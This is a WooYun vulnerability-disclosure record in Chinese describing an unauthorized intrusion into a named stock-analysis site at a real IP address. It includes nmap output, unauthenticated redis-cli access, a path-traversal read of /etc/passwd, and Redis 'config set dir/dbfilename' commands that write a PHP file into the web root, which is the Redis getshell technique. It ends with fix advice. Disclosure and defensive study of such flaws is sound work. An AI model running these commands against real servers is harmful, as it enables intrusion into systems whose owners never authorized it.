{"id": 40395, "wybug_id": "wooyun-2015-0105096", "wybug_title": "经传多盈个股诊断平台利用redis渗透案例", "wybug_corp": "n8n8.cn", "wybug_author": "路人甲", "wybug_date": "2015-03-31 23:06", "wybug_open_date": "2015-05-15 23:08", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-31：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-05-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： redis不设防、不改默认端口危害也是蛮大的 详细说明：  1.使用nmap发现敏感端口6379\n[root@ ~]# nmap -p- sj.n8n8.cnStarting Nmap 5.21 ( http://nmap.org ) at 2015-03-31 22:27 CSTNmap scan report for sj.n8n8.cn (121.14.36.117)Host is up (0.010s latency).Not shown: 65517 closed portsPORT      STATE    SERVICE80/tcp    open     http...1723/tcp  filtered pptp3306/tcp  open     mysql...6379/tcp  open     unknown8080/tcp  open     http-proxy...\n2.尝试ping reids，发现无需认证\n[root@ ~]# redis-cli -h 121.14.36.117 pingPONG...redis 121.14.36.117:6379> info# Serverredis_version:2.6.14redis_git_sha1:00000000redis_git_dirty:0redis_mode:standaloneos:Linux 2.6.18-274.12.1.el5 x86_64....# Memoryused_memory:2049257480used_memory_human:1.91G...\n然后看到之前的例子 WooYun: 电信某服务器getshell可渗透内网（利用redis getshell案例） ，决定搞起，虽然是曾经玩过的CentOS，但是一开始set的时候，并无法确定有php解析的web目录，遂祭出AWVS。（可以看到内存用得不少）3.使用AWVS扫描发现漏洞所在\nPath Fragment input / was set to ../../../../../../../../../../etc/passwd\n\n\n4.使用AWVS寻找root的crontab、nginx配置等感兴趣的内容（可以从根目录找起），后面发现nginx配置在/etc/nginx/vhost/目录下遍历后发现/etc/nginx/vhost/memadmin.conf有php解析\n\n5.找到web目录redis渗透尝试开始[root@ ~]# redis-cli -h 121.14.36.117 redis 121.14.36.117:6379> config set dir /opt/memadminredis 121.14.36.117:6379> config set dbfilename p.phpredis 121.14.36.117:6379> set t \"<?php phpinfo(); ?>\"redis 121.14.36.117:6379> SAVE6.本地增加hosts，访问刚写的p.php\n121.14.36.117 memadmin.jz.biz\n\n\n可以看到报错了，\nParse error: syntax error, unexpected T_STRING in /opt/memadmin/p.php on line 14282\n 7.收手，查看redis配置并将参数还原本人猜想是php文件内容太多导致识别不到，由于是别人的生产环境，这里也不好flushall了再重复上面的流程，所以决定将参数还原。假定非生产环境，那么就先flushall，然后继续测试了。   漏洞证明：  1.redis 信息\n\n2.使用redis写入的php访问效果图\n\n3.服务器上敏感信息\n\n   修复方案：  1.建议redis不使用默认端口，加上密码认证并在防火墙进行限制，控制好web目录的读写权限（redis使用普通用户启动）；2.过滤用户输入  / 和 /css/ 目录都有可以遍历服务器的地方 \n\n   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}